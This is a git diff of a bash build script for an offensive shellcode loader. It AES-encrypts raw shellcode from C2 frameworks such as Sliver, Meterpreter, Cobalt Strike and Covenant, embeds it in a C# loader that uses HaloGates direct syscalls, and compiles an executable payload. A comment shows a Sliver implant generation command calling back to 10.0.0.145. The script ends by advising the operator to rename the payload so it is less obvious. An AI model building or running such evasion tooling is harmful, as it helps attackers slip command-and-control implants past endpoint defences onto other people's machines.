@@ -1,11 +1,7 @@
 #!/bin/bash
 
 ## Version 0.3, using HaloGates for direct syscalls
-## Using sliver shellcode directly without donut
 ## Using AES for shellcode encryption and decryption
-
-mkdir tmp
-mkdir output
 
 ### To Generate a Sliver implant shellcode without obfuscation:
 # [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
@@ -20,9 +16,83 @@ mkdir output
 ### Put the raw shellcode bin file into folder Input
 ### Fill in the following three required parameters
 
-arch="x64"
-c2type="sliver"
-rawscfilename='sliver.bin'
+helpflag=0
+
+while getopts t:a:h flag
+do
+    case "${flag}" in
+        t) c2type=${OPTARG};;
+        a) arch=${OPTARG};;
+        h) helpflag=1;;
+    esac
+done
+
+## Add new C2 type here:
+type_array=("sliver|meterpreter|cobaltstrike|covenant");
+arch_array=("x32|x64");
+
+help_message="""[*] Usage: $0 -t <c2type> -a <target_os_arch>
+                \n[*] Exg..:  $0 -t sliver -a x64
+                \n\n[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin
+                \n[!] Currently c2type only support the following four:
+                \n[!] \t$type_array
+                """
+
+if [ $helpflag == 1 ]; then
+    echo -e $help_message
+    exit
+fi
+
+
+## Check if c2type parameter is valid, otherwise exit
+if [ -z "${c2type}" ]; then
+    echo -e "[!] Error: c2type can not be empty\n"
+    echo -e $help_message
+    exit
+fi
+
+if [[ "${type_array[*]}" =~ "${c2type}" ]]; then
+    echo '[+] c2 type set to: '${c2type}
+else
+    echo "[!] Error: currently c2type only support the following four:"
+    echo -e "$type_array\n"
+    echo -e $help_message
+    exit
+fi
+
+## Check if target arch is valid, otherwise exit
+if [ -z "${arch}" ]; then
+    echo -e "[!] Error: arch can not be empty\n"
+    echo -e $help_message 
+    exit
+fi
+
+if [[ "${arch_array[*]}" =~ "${arch}" ]]; then
+    echo '[+] target OS arch: '${arch}
+else
+    echo '[!] Error: target OS arch only support the following two:'
+    echo -e "$arch_array\n"
+    echo -e $help_message
+    exit
+fi
+
+
+rawscfilename=$c2type'.bin'
+
+
+## Check if target shellcode file exists
+if [[ -f "input/$rawscfilename" ]]; then
+    echo "[+] shellcode file: input/$rawscfilename"
+else
+    echo "[!] Error: input/$rawscfilename is missing"
+    echo "[-] Copy shellcode bin file into folder input and naming it as <c2type>.bin. e.g. sliver.bin, meterpreter.bin etc"
+    exit
+fi
+
+
+
+mkdir tmp
+mkdir output
 
 ### Above are required parameters
 
@@ -38,6 +108,7 @@ cp haloloader_template.txt tmp/$final_cs_filename
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 # encrypt the shellcode payload
 mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt
+
 
 encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
 encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
@@ -68,3 +139,8 @@ sleep 1
 
 # compile the final exe output
 mono-csc -out:output/$final_exe_filename -platform:$arch -unsafe tmp/$final_cs_filename
+
+echo ""
+echo "[+] Done. Check the output folder for the generated payload: $final_exe_filename"
+echo "[+] It is highly recommended to rename the output payload to something not obviously."
+
